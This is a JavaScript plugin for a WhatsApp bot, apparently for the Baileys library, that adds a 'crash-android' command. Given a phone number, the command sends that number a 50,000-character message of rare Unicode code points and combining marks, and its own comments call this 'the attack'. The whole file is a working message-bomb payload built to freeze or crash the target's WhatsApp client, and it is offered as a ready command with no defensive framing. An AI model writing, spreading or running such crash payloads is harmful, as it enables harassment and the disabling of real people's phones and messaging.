/* * 👑 MISA CRASH-ANDROID (FIXED)
 * Ruta: comandos/crash-android.js
 */

import { jidDecode } from '@whiskeysockets/baileys'

let handler = async (conn, m, { args, command, usedPrefix }) => {
    // Si no hay número, responder estéticamente
    if (!args[0]) return m.reply(`✧ ‧₊˚ *MISA CRASH* ୧ֹ˖\n\n> ✐ *Uso:* ${command} [número]\n> 💡 *Ejemplo:* ${command} 1809xxxxxxx`)

    let target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    // Generar 50k de pura entropía
    const generarCarga = (cant) => {
        let str = ""
        const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
        for (let i = 0; i < cant; i++) {
            let bloque = bloques[i % bloques.length]
            str += String.fromCodePoint(bloque + (i % 800))
            if (i % 8 === 0) str += String.fromCodePoint(0x0345) 
        }
        return str
    }

    await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
    
    // El ataque
    await conn.sendMessage(target, { text: generarCarga(50000) })
}

// ESTO ES LO QUE DEFINE EL COMANDO EN TU BOT
handler.help = ['crash-android']
handler.tags = ['travas']
handler.command = ['crash-android', 'ca', 'crash', 'ola']
handler.noPrefix = true // ACTIVAR SIN PREFIJO

export default handler
